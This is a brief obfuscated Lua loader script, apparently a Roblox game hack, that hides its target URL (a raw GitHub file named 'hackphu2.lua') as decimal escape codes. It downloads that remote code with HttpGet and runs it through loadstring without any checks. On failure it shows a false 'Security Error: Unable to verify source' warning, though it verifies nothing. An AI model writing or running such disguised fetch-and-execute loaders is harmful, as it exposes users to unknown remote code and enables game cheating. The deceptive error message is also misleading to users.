--[[vip]]--
local _0xO1 = "getfenv"
local _0xO2 = "loadstring"
local _0xO3 = "HttpGet"
local _0xO4 = "game"

-- mã hóa Hex 
local _0xData = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\108\121\113\117\121\101\110\97\110\104\50\49\45\103\108\105\116\99\104\47\65\110\104\45\108\121\104\117\100\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\104\97\99\107\112\104\117\50\46\108\117\97"

local function _0xExecute(_0xIn)
    local _0xS, _0xErr = pcall(function()
        local _0xEnv = _G[_0xO1] or getfenv
        local _0xLS = _0xEnv()[_0xO2]
        local _0xHG = _G[_0xO4][_0xO3]
        
        return _0xLS(_0xHG(_G[_0xO4], _0xIn))()
    end)
    
    if not _0xS then
        warn("Security Error: Unable to verify source.")
    end
end

_0xExecute(_0xData)
